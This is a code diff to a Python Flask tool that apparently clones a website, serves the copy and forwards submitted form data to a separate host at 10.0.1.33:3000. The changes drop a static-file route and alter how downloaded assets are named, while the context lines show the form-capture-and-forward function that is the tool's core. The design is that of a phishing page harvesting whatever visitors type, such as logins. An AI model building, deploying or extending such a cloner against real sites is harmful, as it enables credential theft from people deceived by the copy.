@@ -1,10 +1,9 @@
 import os
-import sys
 import requests
-from flask import Flask, render_template_string, request, redirect, send_from_directory
+from flask import Flask, render_template_string, request, redirect
 from bs4 import BeautifulSoup
 import argparse
-from urllib.parse import urlparse, urljoin
+from urllib.parse import urljoin
 
 # Initialize Flask app
 app = Flask(__name__)
@@ -40,12 +39,7 @@ def forward_data(form_data, target_url="http://10.0.1.33:3000"):
     except requests.RequestException as e:
         print(f"[ERROR] Error forwarding data: {e}")
 
-# Flask route to serve static files (like CSS, JS, images)
-@app.route("/static/<path:filename>")
-def serve_static(filename):
-    return send_from_directory(static_dir, filename)
-
-# Flask route to handle form submissions and forward data to 10.0.1.33:3000
+# Flask route to serve the cloned website
 @app.route("/", methods=["GET", "POST"])
 def handle_form():
     if request.method == "POST":
@@ -116,7 +110,7 @@ def download_asset(url):
         print(f"[INFO] Downloading asset: {url}")
         asset_response = requests.get(url)
         if asset_response.status_code == 200:
-            asset_name = os.path.join(static_dir, os.path.basename(urlparse(url).path))
+            asset_name = os.path.join(static_dir, os.path.basename(url))
             with open(asset_name, "wb") as f:
                 f.write(asset_response.content)
             print(f"[INFO] Asset saved to {asset_name}")
